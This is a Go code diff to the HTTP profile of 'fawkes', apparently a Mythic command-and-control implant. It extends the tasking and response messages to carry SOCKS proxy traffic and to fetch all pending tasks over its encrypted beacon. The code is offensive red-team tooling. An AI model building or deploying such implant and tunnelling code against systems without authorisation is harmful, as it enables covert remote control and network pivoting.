@@ -170,14 +170,15 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	return nil
 }
 
-// GetTasking retrieves tasks from Mythic
-func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
+// GetTasking retrieves tasks and inbound SOCKS data from Mythic, sending any pending outbound SOCKS data
+func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
 	if h.Debug {
 		// log.Printf("[DEBUG] GetTasking URL: %s%s", h.BaseURL, h.GetEndpoint)
 	}
 	taskingMsg := structs.TaskingMessage{
 		Action:      "get_tasking",
-		TaskingSize: 1, // Request one task at a time for now
+		TaskingSize: -1, // Get all pending tasks (important for SOCKS throughput)
+		Socks:       outboundSocks,
 		// Include agent identification for checkin updates
 		PayloadUUID: h.getActiveUUID(agent), // Use callback UUID if available
 		PayloadType: "fawkes",
@@ -186,7 +187,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 
 	body, err := json.Marshal(taskingMsg)
 	if err != nil {
-		return nil, fmt.Errorf("failed to marshal tasking message: %w", err)
+		return nil, nil, fmt.Errorf("failed to marshal tasking message: %w", err)
 	}
 
 	// Encrypt if encryption key is provided
@@ -205,7 +206,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
 	if err != nil {
 		// log.Printf("[DEBUG] GetTasking makeRequest failed: %v", err)
-		return nil, fmt.Errorf("get tasking request failed: %w", err)
+		return nil, nil, fmt.Errorf("get tasking request failed: %w", err)
 	}
 	defer resp.Body.Close()
 
@@ -213,13 +214,13 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 
 	if resp.StatusCode != http.StatusOK {
 		// log.Printf("[DEBUG] GetTasking failed with non-200 status: %d", resp.StatusCode)
-		return nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
+		return nil, nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
 	}
 
 	respBody, err := io.ReadAll(resp.Body)
 	if err != nil {
 		// log.Printf("[DEBUG] Failed to read GetTasking response body: %v", err)
-		return nil, fmt.Errorf("failed to read response body: %w", err)
+		return nil, nil, fmt.Errorf("failed to read response body: %w", err)
 	}
 
 	// log.Printf("[DEBUG] GetTasking response body length: %d", len(respBody))
@@ -234,13 +235,13 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 		// First, base64 decode the response
 		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
 		if err != nil {
-			return nil, fmt.Errorf("failed to decode response: %w", err)
+			return nil, nil, fmt.Errorf("failed to decode response: %w", err)
 		}
 
 		// Decrypt the decoded data
 		decryptedData, err = h.decryptResponse(decodedData)
 		if err != nil {
-			return nil, fmt.Errorf("failed to decrypt response: %w", err)
+			return nil, nil, fmt.Errorf("failed to decrypt response: %w", err)
 		}
 		if h.Debug {
 			// log.Printf("[DEBUG] Decryption successful")
@@ -256,7 +257,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
 		// If not JSON, might be no tasks
 		// log.Printf("[DEBUG] Response is not JSON, assuming no tasks: %v", err)
-		return []structs.Task{}, nil
+		return []structs.Task{}, nil, nil
 	}
 
 	// log.Printf("[DEBUG] Parsed JSON response with %d top-level keys", len(taskResponse))
@@ -281,7 +282,15 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 		}
 	}
 
-	return tasks, nil
+	// Extract SOCKS messages from response
+	var inboundSocks []structs.SocksMsg
+	if socksList, exists := taskResponse["socks"]; exists {
+		if socksRaw, err := json.Marshal(socksList); err == nil {
+			json.Unmarshal(socksRaw, &inboundSocks)
+		}
+	}
+
+	return tasks, inboundSocks, nil
 }
 
 // decryptResponse decrypts a response from Mythic using the same format as Freyja
@@ -386,11 +395,12 @@ func (h *HTTPProfile) getActiveUUID(agent *structs.Agent) string {
 	return agent.PayloadUUID
 }
 
-// PostResponse sends a response back to Mythic
-func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Agent) ([]byte, error) {
+// PostResponse sends a response back to Mythic, optionally including pending SOCKS data
+func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
 	responseMsg := structs.PostResponseMessage{
 		Action:    "post_response",
 		Responses: []structs.Response{response},
+		Socks:     socks,
 	}
 
 	body, err := json.Marshal(responseMsg)
